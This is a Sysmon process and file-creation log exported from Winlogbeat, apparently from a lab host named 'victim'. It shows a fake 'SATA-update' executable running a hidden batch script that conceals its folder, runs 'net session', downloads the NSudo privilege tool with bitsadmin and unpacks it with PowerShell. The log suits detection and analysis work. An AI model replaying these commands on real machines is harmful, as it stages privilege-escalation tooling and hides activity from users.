ProcessId: 8696
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\Patricia Goh\AppData\Local\Temp\__PSScriptPolicyTest_ociajnh4.xq3.ps1
CreationUtcTime: 2022-10-22 17:41:02.586
User: VICTIM\Patricia Goh","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","{461f0bd2-2b2d-6354-ee02-000000001d00}","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","-","-","powershell.exe","powershell.exe","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",8696,"-","-","-","-","-","-","-","-","-","-","-","-","-","Patricia Goh","-","-",VICTIM,"-","S-1-5-18","Patricia Goh","Patricia Goh","-",wineventlog,"Microsoft-Windows-Sysmon/Operational",victim,"-","2022-10-22 17:41:02.586","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",11,"-","-",Info,"2,316","4,084","{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","Microsoft-Windows-Sysmon",4632,"File created (rule: FileCreate)","NT AUTHORITY","S-1-5-18",SYSTEM,User,2
"Oct 23, 2022 @ 01:41:01.840",OkXJAIQBHC0TB3lJr5d7,".ds-winlogbeat-8.2.3-2022.10.22-000001","-","22391c00-748c-4308-b3a3-5a7add9445bd",victim,"b15c43c7-63a1-423e-901b-f1acc6401711",victim,winlogbeat,"8.2.3","-","-","-","-","-","-","-","1.12.0","Process Create (rule: ProcessCreate)",process,1,"Oct 23, 2022 @ 01:41:03.557","Oct 23, 2022 @ 01:42:08.506",event,sysmon,"-","Microsoft-Windows-Sysmon","-",start,"-","-","-","-","-","x86_64",victim,"461f0bd2-c182-413a-8a41-2a8e4accb4a9","fe80::4959:93ba:69a6:522d, 10.0.2.15, fe80::91a8:3d9e:36ba:f548, 172.19.96.10","08:00:27:7c:f3:ae, 08:00:27:22:f7:3c",victim,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Process Create:
RuleName: -
UtcTime: 2022-10-22 17:41:01.840
ProcessGuid: {461f0bd2-2b2d-6354-ee02-000000001d00}
ProcessId: 8696
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.19041.546 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: powershell.exe  -command ""Expand-Archive -Force 'C:\Supertools\Nsudo.zip' 'C:\Supertools\Nsudo'""
CurrentDirectory: C:\
User: VICTIM\Patricia Goh
LogonGuid: {461f0bd2-06a8-6354-36c5-050000000000}
LogonId: 0x5C536
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=04029E121A0CFA5991749937DD22A1D9,SHA256=9F914D42706FE215501044ACD85A32D58AAEF1419D404FDDFA5D3B48F66CCD9F,IMPHASH=7C955A0ABC747F57CCC4324480737EF7
ParentProcessGuid: {461f0bd2-2b2d-6354-e802-000000001d00}
ParentProcessId: 8868
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""C:\Windows\Sysnative\cmd.exe""  /C C:\Users\PATRIC~1\AppData\Local\Temp\wxy\t20704.bat ""C:\Users\Patricia Goh\Downloads\SATA-update-14.1.0.exe"" 
ParentUser: VICTIM\Patricia Goh","-","-","-","-","-","-","-","-","-","-","-","-","powershell.exe, -command, Expand-Archive -Force 'C:\Supertools\Nsudo.zip' 'C:\Supertools\Nsudo'",3,"powershell.exe  -command ""Expand-Archive -Force 'C:\Supertools\Nsudo.zip' 'C:\Supertools\Nsudo'""","powershell.exe  -command ""Expand-Archive -Force 'C:\Supertools\Nsudo.zip' 'C:\Supertools\Nsudo'""","{461f0bd2-2b2d-6354-ee02-000000001d00}","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",04029e121a0cfa5991749937dd22a1d9,9f914d42706fe215501044acd85a32d58aaef1419d404fddfa5d3b48f66ccd9f,"powershell.exe","powershell.exe","C:\Windows\Sysnative\cmd.exe, /C, C:\Users\PATRIC~1\AppData\Local\Temp\wxy\t20704.bat, C:\Users\Patricia Goh\Downloads\SATA-update-14.1.0.exe",4,"""C:\Windows\Sysnative\cmd.exe""  /C C:\Users\PATRIC~1\AppData\Local\Temp\wxy\t20704.bat ""C:\Users\Patricia Goh\Downloads\SATA-update-14.1.0.exe"" ","""C:\Windows\Sysnative\cmd.exe""  /C C:\Users\PATRIC~1\AppData\Local\Temp\wxy\t20704.bat ""C:\Users\Patricia Goh\Downloads\SATA-update-14.1.0.exe"" ","{461f0bd2-2b2d-6354-e802-000000001d00}","C:\Windows\System32\cmd.exe","C:\Windows\System32\cmd.exe","cmd.exe","cmd.exe",8868,"Microsoft Corporation","Windows PowerShell","10.0.19041.546 (WinBuild.160101.0800)",7c955a0abc747f57ccc4324480737ef7,"PowerShell.EXE","Microsoft® Windows® Operating System",8696,"-","-","C:\","C:\","-","-","-","-","-","-","9f914d42706fe215501044acd85a32d58aaef1419d404fddfa5d3b48f66ccd9f, 04029e121a0cfa5991749937dd22a1d9, 7c955a0abc747f57ccc4324480737ef7","-","-","Patricia Goh","-","-",VICTIM,"-","S-1-5-18","Patricia Goh","Patricia Goh","-",wineventlog,"Microsoft-Windows-Sysmon/Operational",victim,"Microsoft Corporation","-","Windows PowerShell","-","10.0.19041.546 (WinBuild.160101.0800)",High,"{461f0bd2-06a8-6354-36c5-050000000000}",0x5c536,"-","VICTIM\Patricia Goh","-","Microsoft® Windows® Operating System","-","-","-","-","-","-","-","-",1,"-",1,"-","-",Info,"2,316","4,084","{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","Microsoft-Windows-Sysmon",4631,"Process Create (rule: ProcessCreate)","NT AUTHORITY","S-1-5-18",SYSTEM,User,5
"Oct 23, 2022 @ 01:41:01.435",NkXJAIQBHC0TB3lJqpdu,".ds-winlogbeat-8.2.3-2022.10.22-000001","-","22391c00-748c-4308-b3a3-5a7add9445bd",victim,"b15c43c7-63a1-423e-901b-f1acc6401711",victim,winlogbeat,"8.2.3","-","-","-","-","-","-","-","1.12.0","Process Create (rule: ProcessCreate)",process,1,"Oct 23, 2022 @ 01:41:01.639","Oct 23, 2022 @ 01:42:07.214",event,sysmon,"-","Microsoft-Windows-Sysmon","-",start,"-","-","-","-","-","x86_64",victim,"461f0bd2-c182-413a-8a41-2a8e4accb4a9","fe80::4959:93ba:69a6:522d, 10.0.2.15, fe80::91a8:3d9e:36ba:f548, 172.19.96.10","08:00:27:7c:f3:ae, 08:00:27:22:f7:3c",victim,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Process Create:
RuleName: -
UtcTime: 2022-10-22 17:41:01.435
ProcessGuid: {461f0bd2-2b2d-6354-ed02-000000001d00}
ProcessId: 8984
Image: C:\Windows\System32\bitsadmin.exe
FileVersion: 7.8.19041.1 (WinBuild.160101.0800)
Description: BITS administration utility
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: bitsadmin.exe
CommandLine: bitsadmin  /transfer Download /download /priority FOREGROUND  https://github.com/M2Team/NSudo/releases/download/9.0-Preview1/NSudo_9.0_Preview1_9.0.2676.0.zip  C:\Supertools\Nsudo.zip 
CurrentDirectory: C:\
User: VICTIM\Patricia Goh
LogonGuid: {461f0bd2-06a8-6354-36c5-050000000000}
LogonId: 0x5C536
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=01AAB62D5799F75B0D69EB29C1CA6855,SHA256=739B2DD012EA183895CC01116906F339C9AA1C0BAABF6F22C8E59E25A0C12917,IMPHASH=774033454EB79213B09F788FC004A02D
ParentProcessGuid: {461f0bd2-2b2d-6354-e802-000000001d00}
ParentProcessId: 8868
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""C:\Windows\Sysnative\cmd.exe""  /C C:\Users\PATRIC~1\AppData\Local\Temp\wxy\t20704.bat ""C:\Users\Patricia Goh\Downloads\SATA-update-14.1.0.exe"" 
ParentUser: VICTIM\Patricia Goh","-","-","-","-","-","-","-","-","-","-","-","-","bitsadmin, /transfer, Download, /download, /priority, FOREGROUND, https://github.com/M2Team/NSudo/releases/download/9.0-Preview1/NSudo_9.0_Preview1_9.0.2676.0.zip, C:\Supertools\Nsudo.zip",8,"bitsadmin  /transfer Download /download /priority FOREGROUND  https://github.com/M2Team/NSudo/releases/download/9.0-Preview1/NSudo_9.0_Preview1_9.0.2676.0.zip  C:\Supertools\Nsudo.zip ","bitsadmin  /transfer Download /download /priority FOREGROUND  https://github.com/M2Team/NSudo/releases/download/9.0-Preview1/NSudo_9.0_Preview1_9.0.2676.0.zip  C:\Supertools\Nsudo.zip ","{461f0bd2-2b2d-6354-ed02-000000001d00}","C:\Windows\System32\bitsadmin.exe","C:\Windows\System32\bitsadmin.exe",01aab62d5799f75b0d69eb29c1ca6855,739b2dd012ea183895cc01116906f339c9aa1c0baabf6f22c8e59e25a0c12917,"bitsadmin.exe","bitsadmin.exe","C:\Windows\Sysnative\cmd.exe, /C, C:\Users\PATRIC~1\AppData\Local\Temp\wxy\t20704.bat, C:\Users\Patricia Goh\Downloads\SATA-update-14.1.0.exe",4,"""C:\Windows\Sysnative\cmd.exe""  /C C:\Users\PATRIC~1\AppData\Local\Temp\wxy\t20704.bat ""C:\Users\Patricia Goh\Downloads\SATA-update-14.1.0.exe"" ","""C:\Windows\Sysnative\cmd.exe""  /C C:\Users\PATRIC~1\AppData\Local\Temp\wxy\t20704.bat ""C:\Users\Patricia Goh\Downloads\SATA-update-14.1.0.exe"" ","{461f0bd2-2b2d-6354-e802-000000001d00}","C:\Windows\System32\cmd.exe","C:\Windows\System32\cmd.exe","cmd.exe","cmd.exe",8868,"Microsoft Corporation","BITS administration utility","7.8.19041.1 (WinBuild.160101.0800)",774033454eb79213b09f788fc004a02d,"bitsadmin.exe","Microsoft® Windows® Operating System",8984,"-","-","C:\","C:\","-","-","-","-","-","-","739b2dd012ea183895cc01116906f339c9aa1c0baabf6f22c8e59e25a0c12917, 01aab62d5799f75b0d69eb29c1ca6855, 774033454eb79213b09f788fc004a02d","-","-","Patricia Goh","-","-",VICTIM,"-","S-1-5-18","Patricia Goh","Patricia Goh","-",wineventlog,"Microsoft-Windows-Sysmon/Operational",victim,"Microsoft Corporation","-","BITS administration utility","-","7.8.19041.1 (WinBuild.160101.0800)",High,"{461f0bd2-06a8-6354-36c5-050000000000}",0x5c536,"-","VICTIM\Patricia Goh","-","Microsoft® Windows® Operating System","-","-","-","-","-","-","-","-",1,"-",1,"-","-",Info,"2,316","4,084","{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","Microsoft-Windows-Sysmon",4630,"Process Create (rule: ProcessCreate)","NT AUTHORITY","S-1-5-18",SYSTEM,User,5
"Oct 23, 2022 @ 01:41:01.375",NUXJAIQBHC0TB3lJqpdu,".ds-winlogbeat-8.2.3-2022.10.22-000001","-","22391c00-748c-4308-b3a3-5a7add9445bd",victim,"b15c43c7-63a1-423e-901b-f1acc6401711",victim,winlogbeat,"8.2.3","-","-","-","-","-","-","-","1.12.0","Process Create (rule: ProcessCreate)",process,1,"Oct 23, 2022 @ 01:41:01.639","Oct 23, 2022 @ 01:42:07.213",event,sysmon,"-","Microsoft-Windows-Sysmon","-",start,"-","-","-","-","-","x86_64",victim,"461f0bd2-c182-413a-8a41-2a8e4accb4a9","fe80::4959:93ba:69a6:522d, 10.0.2.15, fe80::91a8:3d9e:36ba:f548, 172.19.96.10","08:00:27:7c:f3:ae, 08:00:27:22:f7:3c",victim,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Process Create:
RuleName: -
UtcTime: 2022-10-22 17:41:01.375
ProcessGuid: {461f0bd2-2b2d-6354-ec02-000000001d00}
ProcessId: 736
Image: C:\Windows\System32\net1.exe
FileVersion: 10.0.19041.1466 (WinBuild.160101.0800)
Description: Net Command
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: net1.exe
CommandLine: C:\Windows\system32\net1  session 
CurrentDirectory: C:\Users\Patricia Goh\Downloads\
User: VICTIM\Patricia Goh
LogonGuid: {461f0bd2-06a8-6354-36c5-050000000000}
LogonId: 0x5C536
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=55693DF2BB3CBE2899DFDDF18B4EB8C9,SHA256=18F76BC1F02A161EBDEDF3142273C186D05A836ADDCAAEE599194089FD59F398,IMPHASH=537AEF5B177E3302247DAB07A052B2D8
ParentProcessGuid: {461f0bd2-2b2d-6354-eb02-000000001d00}
ParentProcessId: 9148
ParentImage: C:\Windows\System32\net.exe
ParentCommandLine: net  session 
ParentUser: VICTIM\Patricia Goh","-","-","-","-","-","-","-","-","-","-","-","-","C:\Windows\system32\net1, session",2,"C:\Windows\system32\net1  session ","C:\Windows\system32\net1  session ","{461f0bd2-2b2d-6354-ec02-000000001d00}","C:\Windows\System32\net1.exe","C:\Windows\System32\net1.exe",55693df2bb3cbe2899dfddf18b4eb8c9,18f76bc1f02a161ebdedf3142273c186d05a836addcaaee599194089fd59f398,"net1.exe","net1.exe","net, session",2,"net  session ","net  session ","{461f0bd2-2b2d-6354-eb02-000000001d00}","C:\Windows\System32\net.exe","C:\Windows\System32\net.exe","net.exe","net.exe",9148,"Microsoft Corporation","Net Command","10.0.19041.1466 (WinBuild.160101.0800)",537aef5b177e3302247dab07a052b2d8,"net1.exe","Microsoft® Windows® Operating System",736,"-","-","C:\Users\Patricia Goh\Downloads\","C:\Users\Patricia Goh\Downloads\","-","-","-","-","-","-","18f76bc1f02a161ebdedf3142273c186d05a836addcaaee599194089fd59f398, 55693df2bb3cbe2899dfddf18b4eb8c9, 537aef5b177e3302247dab07a052b2d8","-","-","Patricia Goh","-","-",VICTIM,"-","S-1-5-18","Patricia Goh","Patricia Goh","-",wineventlog,"Microsoft-Windows-Sysmon/Operational",victim,"Microsoft Corporation","-","Net Command","-","10.0.19041.1466 (WinBuild.160101.0800)",High,"{461f0bd2-06a8-6354-36c5-050000000000}",0x5c536,"-","VICTIM\Patricia Goh","-","Microsoft® Windows® Operating System","-","-","-","-","-","-","-","-",1,"-",1,"-","-",Info,"2,316","4,084","{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","Microsoft-Windows-Sysmon",4629,"Process Create (rule: ProcessCreate)","NT AUTHORITY","S-1-5-18",SYSTEM,User,5
"Oct 23, 2022 @ 01:41:01.340",NEXJAIQBHC0TB3lJqpdu,".ds-winlogbeat-8.2.3-2022.10.22-000001","-","22391c00-748c-4308-b3a3-5a7add9445bd",victim,"b15c43c7-63a1-423e-901b-f1acc6401711",victim,winlogbeat,"8.2.3","-","-","-","-","-","-","-","1.12.0","Process Create (rule: ProcessCreate)",process,1,"Oct 23, 2022 @ 01:41:01.639","Oct 23, 2022 @ 01:42:07.213",event,sysmon,"-","Microsoft-Windows-Sysmon","-",start,"-","-","-","-","-","x86_64",victim,"461f0bd2-c182-413a-8a41-2a8e4accb4a9","fe80::4959:93ba:69a6:522d, 10.0.2.15, fe80::91a8:3d9e:36ba:f548, 172.19.96.10","08:00:27:7c:f3:ae, 08:00:27:22:f7:3c",victim,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Process Create:
RuleName: -
UtcTime: 2022-10-22 17:41:01.340
ProcessGuid: {461f0bd2-2b2d-6354-eb02-000000001d00}
ProcessId: 9148
Image: C:\Windows\System32\net.exe
FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
Description: Net Command
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: net.exe
CommandLine: net  session 
CurrentDirectory: C:\Users\Patricia Goh\Downloads\
User: VICTIM\Patricia Goh
LogonGuid: {461f0bd2-06a8-6354-36c5-050000000000}
LogonId: 0x5C536
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=0BD94A338EEA5A4E1F2830AE326E6D19,SHA256=9F376759BCBCD705F726460FC4A7E2B07F310F52BAA73CAAAAA124FDDBDF993E,IMPHASH=57F0C47AE2A1A2C06C8B987372AB0B07
ParentProcessGuid: {461f0bd2-2b2d-6354-e802-000000001d00}
ParentProcessId: 8868
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""C:\Windows\Sysnative\cmd.exe""  /C C:\Users\PATRIC~1\AppData\Local\Temp\wxy\t20704.bat ""C:\Users\Patricia Goh\Downloads\SATA-update-14.1.0.exe"" 
ParentUser: VICTIM\Patricia Goh","-","-","-","-","-","-","-","-","-","-","-","-","net, session",2,"net  session ","net  session ","{461f0bd2-2b2d-6354-eb02-000000001d00}","C:\Windows\System32\net.exe","C:\Windows\System32\net.exe",0bd94a338eea5a4e1f2830ae326e6d19,9f376759bcbcd705f726460fc4a7e2b07f310f52baa73caaaaa124fddbdf993e,"net.exe","net.exe","C:\Windows\Sysnative\cmd.exe, /C, C:\Users\PATRIC~1\AppData\Local\Temp\wxy\t20704.bat, C:\Users\Patricia Goh\Downloads\SATA-update-14.1.0.exe",4,"""C:\Windows\Sysnative\cmd.exe""  /C C:\Users\PATRIC~1\AppData\Local\Temp\wxy\t20704.bat ""C:\Users\Patricia Goh\Downloads\SATA-update-14.1.0.exe"" ","""C:\Windows\Sysnative\cmd.exe""  /C C:\Users\PATRIC~1\AppData\Local\Temp\wxy\t20704.bat ""C:\Users\Patricia Goh\Downloads\SATA-update-14.1.0.exe"" ","{461f0bd2-2b2d-6354-e802-000000001d00}","C:\Windows\System32\cmd.exe","C:\Windows\System32\cmd.exe","cmd.exe","cmd.exe",8868,"Microsoft Corporation","Net Command","10.0.19041.1 (WinBuild.160101.0800)",57f0c47ae2a1a2c06c8b987372ab0b07,"net.exe","Microsoft® Windows® Operating System",9148,"-","-","C:\Users\Patricia Goh\Downloads\","C:\Users\Patricia Goh\Downloads\","-","-","-","-","-","-","9f376759bcbcd705f726460fc4a7e2b07f310f52baa73caaaaa124fddbdf993e, 0bd94a338eea5a4e1f2830ae326e6d19, 57f0c47ae2a1a2c06c8b987372ab0b07","-","-","Patricia Goh","-","-",VICTIM,"-","S-1-5-18","Patricia Goh","Patricia Goh","-",wineventlog,"Microsoft-Windows-Sysmon/Operational",victim,"Microsoft Corporation","-","Net Command","-","10.0.19041.1 (WinBuild.160101.0800)",High,"{461f0bd2-06a8-6354-36c5-050000000000}",0x5c536,"-","VICTIM\Patricia Goh","-","Microsoft® Windows® Operating System","-","-","-","-","-","-","-","-",1,"-",1,"-","-",Info,"2,316","4,084","{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","Microsoft-Windows-Sysmon",4628,"Process Create (rule: ProcessCreate)","NT AUTHORITY","S-1-5-18",SYSTEM,User,5
"Oct 23, 2022 @ 01:41:01.283",M0XJAIQBHC0TB3lJqpdu,".ds-winlogbeat-8.2.3-2022.10.22-000001","-","22391c00-748c-4308-b3a3-5a7add9445bd",victim,"b15c43c7-63a1-423e-901b-f1acc6401711",victim,winlogbeat,"8.2.3","-","-","-","-","-","-","-","1.12.0","Process Create (rule: ProcessCreate)",process,1,"Oct 23, 2022 @ 01:41:01.639","Oct 23, 2022 @ 01:42:07.213",event,sysmon,"-","Microsoft-Windows-Sysmon","-",start,"-","-","-","-","-","x86_64",victim,"461f0bd2-c182-413a-8a41-2a8e4accb4a9","fe80::4959:93ba:69a6:522d, 10.0.2.15, fe80::91a8:3d9e:36ba:f548, 172.19.96.10","08:00:27:7c:f3:ae, 08:00:27:22:f7:3c",victim,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Process Create:
RuleName: -
UtcTime: 2022-10-22 17:41:01.283
ProcessGuid: {461f0bd2-2b2d-6354-ea02-000000001d00}
ProcessId: 7776
Image: C:\Windows\System32\attrib.exe
FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
Description: Attribute Utility
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: ATTRIB.EXE
CommandLine: attrib  +h C:\Users\PATRIC~1\AppData\Local\Temp\wxy
CurrentDirectory: C:\Users\Patricia Goh\Downloads\
User: VICTIM\Patricia Goh
LogonGuid: {461f0bd2-06a8-6354-36c5-050000000000}
LogonId: 0x5C536
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=5037D8E6670EF1D89FB6AD435F12A9FD,SHA256=1043111FF07814B0D3439561B4CEE5D7EC1799A7A0A419949FEE707666F6DDED,IMPHASH=2CB38FE7D8F223D9DA50B7CBA9B95A6D
ParentProcessGuid: {461f0bd2-2b2d-6354-e802-000000001d00}
ParentProcessId: 8868
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""C:\Windows\Sysnative\cmd.exe""  /C C:\Users\PATRIC~1\AppData\Local\Temp\wxy\t20704.bat ""C:\Users\Patricia Goh\Downloads\SATA-update-14.1.0.exe"" 
ParentUser: VICTIM\Patricia Goh","-","-","-","-","-","-","-","-","-","-","-","-","attrib, +h, C:\Users\PATRIC~1\AppData\Local\Temp\wxy",3,"attrib  +h C:\Users\PATRIC~1\AppData\Local\Temp\wxy","attrib  +h C:\Users\PATRIC~1\AppData\Local\Temp\wxy","{461f0bd2-2b2d-6354-ea02-000000001d00}","C:\Windows\System32\attrib.exe","C:\Windows\System32\attrib.exe",5037d8e6670ef1d89fb6ad435f12a9fd,1043111ff07814b0d3439561b4cee5d7ec1799a7a0a419949fee707666f6dded,"attrib.exe","attrib.exe","C:\Windows\Sysnative\cmd.exe, /C, C:\Users\PATRIC~1\AppData\Local\Temp\wxy\t20704.bat, C:\Users\Patricia Goh\Downloads\SATA-update-14.1.0.exe",4,"""C:\Windows\Sysnative\cmd.exe""  /C C:\Users\PATRIC~1\AppData\Local\Temp\wxy\t20704.bat ""C:\Users\Patricia Goh\Downloads\SATA-update-14.1.0.exe"" ","""C:\Windows\Sysnative\cmd.exe""  /C C:\Users\PATRIC~1\AppData\Local\Temp\wxy\t20704.bat ""C:\Users\Patricia Goh\Downloads\SATA-update-14.1.0.exe"" ","{461f0bd2-2b2d-6354-e802-000000001d00}","C:\Windows\System32\cmd.exe","C:\Windows\System32\cmd.exe","cmd.exe","cmd.exe",8868,"Microsoft Corporation","Attribute Utility","10.0.19041.1 (WinBuild.160101.0800)",2cb38fe7d8f223d9da50b7cba9b95a6d,"ATTRIB.EXE","Microsoft® Windows® Operating System",7776,"-","-","C:\Users\Patricia Goh\Downloads\","C:\Users\Patricia Goh\Downloads\","-","-","-","-","-","-","1043111ff07814b0d3439561b4cee5d7ec1799a7a0a419949fee707666f6dded, 5037d8e6670ef1d89fb6ad435f12a9fd, 2cb38fe7d8f223d9da50b7cba9b95a6d","-","-","Patricia Goh","-","-",VICTIM,"-","S-1-5-18","Patricia Goh","Patricia Goh","-",wineventlog,"Microsoft-Windows-Sysmon/Operational",victim,"Microsoft Corporation","-","Attribute Utility","-","10.0.19041.1 (WinBuild.160101.0800)",High,"{461f0bd2-06a8-6354-36c5-050000000000}",0x5c536,"-","VICTIM\Patricia Goh","-","Microsoft® Windows® Operating System","-","-","-","-","-","-","-","-",1,"-",1,"-","-",Info,"2,316","4,084","{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","Microsoft-Windows-Sysmon",4627,"Process Create (rule: ProcessCreate)","NT AUTHORITY","S-1-5-18",SYSTEM,User,5
"Oct 23, 2022 @ 01:41:01.125",MkXJAIQBHC0TB3lJqpdu,".ds-winlogbeat-8.2.3-2022.10.22-000001","-","22391c00-748c-4308-b3a3-5a7add9445bd",victim,"b15c43c7-63a1-423e-901b-f1acc6401711",victim,winlogbeat,"8.2.3","-","-","-","-","-","-","-","1.12.0","Process Create (rule: ProcessCreate)",process,1,"Oct 23, 2022 @ 01:41:01.639","Oct 23, 2022 @ 01:42:07.212",event,sysmon,"-","Microsoft-Windows-Sysmon","-",start,"-","-","-","-","-","x86_64",victim,"461f0bd2-c182-413a-8a41-2a8e4accb4a9","fe80::4959:93ba:69a6:522d, 10.0.2.15, fe80::91a8:3d9e:36ba:f548, 172.19.96.10","08:00:27:7c:f3:ae, 08:00:27:22:f7:3c",victim,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Process Create:
RuleName: -
UtcTime: 2022-10-22 17:41:01.125
ProcessGuid: {461f0bd2-2b2d-6354-e802-000000001d00}
ProcessId: 8868
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.19041.746 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""C:\Windows\Sysnative\cmd.exe""  /C C:\Users\PATRIC~1\AppData\Local\Temp\wxy\t20704.bat ""C:\Users\Patricia Goh\Downloads\SATA-update-14.1.0.exe"" 
CurrentDirectory: C:\Users\Patricia Goh\Downloads\
User: VICTIM\Patricia Goh
LogonGuid: {461f0bd2-06a8-6354-36c5-050000000000}
LogonId: 0x5C536
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: {461f0bd2-2b2c-6354-e502-000000001d00}
ParentProcessId: 4324
ParentImage: C:\Users\Patricia Goh\Downloads\SATA-update-14.1.0.exe
ParentCommandLine: ""C:\Users\Patricia Goh\Downloads\SATA-update-14.1.0.exe"" 
ParentUser: VICTIM\Patricia Goh","-","-","-","-","-","-","-","-","-","-","-","-","C:\Windows\Sysnative\cmd.exe, /C, C:\Users\PATRIC~1\AppData\Local\Temp\wxy\t20704.bat, C:\Users\Patricia Goh\Downloads\SATA-update-14.1.0.exe",4,"""C:\Windows\Sysnative\cmd.exe""  /C C:\Users\PATRIC~1\AppData\Local\Temp\wxy\t20704.bat ""C:\Users\Patricia Goh\Downloads\SATA-update-14.1.0.exe"" ","""C:\Windows\Sysnative\cmd.exe""  /C C:\Users\PATRIC~1\AppData\Local\Temp\wxy\t20704.bat ""C:\Users\Patricia Goh\Downloads\SATA-update-14.1.0.exe"" ","{461f0bd2-2b2d-6354-e802-000000001d00}","C:\Windows\System32\cmd.exe","C:\Windows\System32\cmd.exe",8a2122e8162dbef04694b9c3e0b6cdee,b99d61d874728edc0918ca0eb10eab93d381e7367e377406e65963366c874450,"cmd.exe","cmd.exe","C:\Users\Patricia Goh\Downloads\SATA-update-14.1.0.exe",1,"""C:\Users\Patricia Goh\Downloads\SATA-update-14.1.0.exe"" ","""C:\Users\Patricia Goh\Downloads\SATA-update-14.1.0.exe"" ","{461f0bd2-2b2c-6354-e502-000000001d00}","C:\Users\Patricia Goh\Downloads\SATA-update-14.1.0.exe","C:\Users\Patricia Goh\Downloads\SATA-update-14.1.0.exe","SATA-update-14.1.0.exe","SATA-update-14.1.0.exe",4324,"Microsoft Corporation","Windows Command Processor","10.0.19041.746 (WinBuild.160101.0800)",272245e2988e1e430500b852c4fb5e18,"Cmd.Exe","Microsoft® Windows® Operating System",8868,"-","-","C:\Users\Patricia Goh\Downloads\","C:\Users\Patricia Goh\Downloads\","-","-","-","-","-","-","b99d61d874728edc0918ca0eb10eab93d381e7367e377406e65963366c874450, 8a2122e8162dbef04694b9c3e0b6cdee, 272245e2988e1e430500b852c4fb5e18","-","-","Patricia Goh","-","-",VICTIM,"-","S-1-5-18","Patricia Goh","Patricia Goh","-",wineventlog,"Microsoft-Windows-Sysmon/Operational",victim,"Microsoft Corporation","-","Windows Command Processor","-","10.0.19041.746 (WinBuild.160101.0800)",High,"{461f0bd2-06a8-6354-36c5-050000000000}",0x5c536,"-","VICTIM\Patricia Goh","-","Microsoft® Windows® Operating System","-","-","-","-","-","-","-","-",1,"-",1,"-","-",Info,"2,316","4,084","{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","Microsoft-Windows-Sysmon",4626,"Process Create (rule: ProcessCreate)","NT AUTHORITY","S-1-5-18",SYSTEM,User,5
